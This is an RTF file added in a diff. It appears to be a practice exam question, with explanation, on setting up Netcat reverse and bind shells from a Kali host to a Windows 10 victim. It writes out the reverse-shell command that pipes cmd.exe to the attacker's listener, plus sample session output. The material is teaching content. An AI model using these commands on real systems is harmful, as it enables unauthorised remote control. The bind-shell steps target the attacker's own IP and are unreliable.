@@ -1,0 +1,58 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2758
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fnil\fcharset0 UbuntuMono-Regular;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww13440\viewh8400\viewkind0
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\f0\fs28 \cf0 You are running Kali Linux within the target network. \
+The victim machine is a Windows 10 client with Netcat installed. \
+The machines have the following IP addresses: \
+	172.18.60.248 \'96 kali.local.net \
+	172.18.60.250 \'96 win10.local.net \
+\
+You want to list the contents of the Admin user\'92s directory on the victim machine. \
+\
+Which commands should be executed on each system to perform this reverse shell using Netcat? \
+\
+Unordered Choices \
+	C:\\Users\\Admin> nc.exe -lvp 4444 \'96 e cmd.exe \
+	root@kali:~# nc 172.18.60.248 4444 \
+	root@kali:~# ls \
+	C:\\Users\\Admin> nc.exe 172.18.60.248 4444 \'96e cmd.exe \
+	root@kali:~# nc -lvp 4444 C:\\Users\\Admin> dir Up Down Explain Reset Ok \
+\
+\
+In reverse shell, a network service listens on the attack host, the target then passes the shell to the attacker, and the attack host executes shell commands remotely on the target host. \
+To list the contents of the Admin user\'92s directory using a Netcat reverse shell, you would perform the following steps: \
+\
+1. Run root@kali:~# nc -lvp 4444 on 172.18.60.248 (attack host). \
+2. Run C:\\Users\\Admin> nc.exe 172.18.60.248 4444 \'96e cmd.exe on 172.18.60.250 (target host). \
+3. Run C:\\Users\\Admin> dir on 172.18.60.248 (attack host). \
+\
+The first step sets up the network service on the attack host using Netcat over port 4444. The output would resemble the following: \
+\
+	 listening on [any] 4444 ... \
+\
+The second step then connects the target host to the attack host using Netcat. \
+The output on the attacker machine will now resemble the following: \
+\
+	connect to [172.18.60.248] from Win10Victim.home.net [172.18.60.250] \
+	49435 Microsoft Windows [Version 10.0.19045.3208] \
+	Copyright (c) Microsoft Corporation. All rights reserved. \
+	C:\\Users\\Admin> \
+\
+Now that the connection has been established with the Windows console prompt, the third step lists the directory of the Admin user on the attack host using the dir command. \
+In a bind shell, an attacker connects directly to a target system\'92s shell, usually bound to a listening port. \
+\
+\
+You would perform the following steps for a Netcat bind shell, not a reverse shell: \
+\
+1. Run C:\\Users\\Admin> nc.exe -lvp 4444 \'96e cmd.exe on 172.18.60.250 (target host). \
+2. Run root@kali:~# nc 172.18.60.248 4444 on 172.18.60.248 (attack host). \
+3. Run C:\\Users\\Admin> dir on 172.18.60.248 (attack host). The first step binds the command shell directly to the network service listener. The attacker then connects to the target host in the second step. The third step is the same.\
+\
+\
+##############################\
+\
+}
